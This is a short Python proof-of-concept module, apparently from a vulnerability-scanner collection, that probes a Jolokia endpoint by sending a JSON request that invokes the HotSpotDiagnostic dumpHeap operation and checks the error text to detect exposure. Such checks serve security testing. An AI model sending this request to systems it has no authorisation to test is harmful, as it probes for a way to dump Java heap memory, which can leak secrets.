import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Jolokia Java Heap Information Disclosure''',
        "description": '''''',
        "severity": "info",
        "references": [
            ""
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["jolokia", "disclosure", "java"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/jolokia/"""
        method = "POST"
        data = """
{
   "type":"EXEC",
   "mbean":"com.sun.management:type=HotSpotDiagnostic",
   "operation":"dumpHeap",
   "arguments":[
      "/tmp1234/test1.hprof",
      0
   ]
}"""
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""stacktrace":"java.io.IOException: No such file or directory""" in resp0.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url